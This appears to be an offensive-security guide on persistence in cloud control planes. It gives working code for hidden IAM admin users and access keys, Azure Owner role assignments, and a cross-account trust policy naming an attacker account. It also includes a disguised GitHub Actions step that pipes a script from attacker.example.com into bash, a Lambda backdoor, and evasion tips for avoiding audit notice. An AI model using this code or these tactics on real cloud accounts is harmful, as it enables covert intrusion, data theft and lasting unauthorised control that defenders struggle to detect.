# Cloud control plane persistence

Cloud persistence lives in configuration, not code. IAM roles, service accounts,
automation pipelines, and policy attachments are rarely reviewed with the same
scrutiny as endpoint artefacts, and changes to them look like normal infrastructure
administration.

## IAM backdoor roles and policies

Creating a hidden IAM entity with administrative access that is not associated with
any named employee account provides persistent access that outlasts the initial
compromise and survives user password resets.

AWS:

```python
import boto3

iam = boto3.client('iam')

# create a backdoor IAM user with administrator access
iam.create_user(UserName='cloudwatch-agent-service')
iam.attach_user_policy(
    UserName='cloudwatch-agent-service',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
creds = iam.create_access_key(UserName='cloudwatch-agent-service')
# store: creds['AccessKey']['AccessKeyId'] and creds['AccessKey']['SecretAccessKey']
```

The username `cloudwatch-agent-service` blends with legitimate AWS service account
naming conventions. The access key persists indefinitely unless explicitly rotated.

Azure:

```powershell
# add a backdoor account to a high-privilege role
$role = Get-AzRoleDefinition -Name "Owner"
$newUser = New-AzADUser -DisplayName "Azure Operations" -UserPrincipalName "ops@tenant.onmicrosoft.com" -Password $securePass -MailNickname "azops"
New-AzRoleAssignment -ObjectId $newUser.Id -RoleDefinitionName "Owner" -Scope "/subscriptions/SUBSCRIPTION_ID"
```

## Overpermissive policy attachment

Rather than creating new entities, attaching an overpermissive policy to an existing
entity (one that is not under scrutiny) achieves the same result with less visibility:

```python
# attach AdministratorAccess to an existing low-profile service role
# that was previously used only for read operations
iam.attach_role_policy(
    RoleName='lambda-read-logs-role',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
```

A role named `lambda-read-logs-role` with administrator access is anomalous but will
not be noticed without explicit IAM auditing.

## Inline policy with persistent backdoor condition

AWS inline policies support condition keys. A policy that allows `sts:AssumeRole`
from a specific external account ID creates a cross-account backdoor:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root" },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": { "sts:ExternalId": "b4ckd00r-2024" }
    }
  }]
}
```

Attaching this as a trust policy to a high-privilege role allows the attacker to
assume it from an external account indefinitely.

## CI/CD pipeline persistence

CI/CD pipelines (GitHub Actions, GitLab CI, Azure Pipelines, Jenkins) execute code
with cloud credentials and often have more access than the humans who maintain them.
Persisting in a pipeline means code runs on every deployment.

GitHub Actions:

```yaml
# add to an existing workflow file, or create a new one in .github/workflows/
# this runs on every push to main and establishes a reverse shell to the attacker
name: CI Health Check
on:
  push:
    branches: [main]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: System health verification
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # legitimate-looking step that also establishes persistence
          curl -s https://attacker.example.com/setup.sh | bash &
          echo "Health check complete"
```

A workflow file that runs a "health check" on every CI run, with the malicious action
backgrounded, is unlikely to attract attention among the legitimate CI steps.

## Cloud function and serverless persistence

Lambda functions, Azure Functions, and Google Cloud Functions execute on demand, have
associated IAM roles, and can be updated without touching any server:

```python
# update an existing Lambda function's code to include a backdoor
# the function continues to perform its legitimate task but also sends telemetry
import boto3, base64, zipfile, io

lambda_client = boto3.client('lambda')

# get current function code
response = lambda_client.get_function(FunctionName='data-processor')
# modify the code to add persistence
# repackage and update
lambda_client.update_function_code(
    FunctionName='data-processor',
    ZipFile=modified_zip_bytes
)
```

The function continues to perform its legitimate purpose. Reviewing its code requires
deliberate inspection of the deployment package.

## Storage-based persistence

Placing a payload in a storage location that is periodically executed:

- S3 buckets used as Lambda deployment packages: update the package, trigger a
  Lambda update
- Azure Blob storage used as runbook source for Azure Automation
- GCS buckets backing Cloud Functions

If the execution mechanism polls the storage location for updates, controlling the
storage location provides ongoing code execution without touching compute resources
directly.

## Operational notes

Cloud persistence is most effective when:

- The entity name matches the organisation's naming conventions
- The permissions are slightly higher than the entity's stated purpose but not
  obviously excessive
- The persistence is established in a region or account that is less actively monitored
  (dev, test, or secondary regions)
- Changes are spaced out to avoid appearing in a bulk change audit

Cloud provider audit logs (CloudTrail, Azure Monitor, GCP Cloud Audit Logs) record
all control plane changes. The persistence actions above will appear in those logs.
The question is whether anyone is reviewing them, how quickly, and whether the
naming is suspicious enough to attract attention.
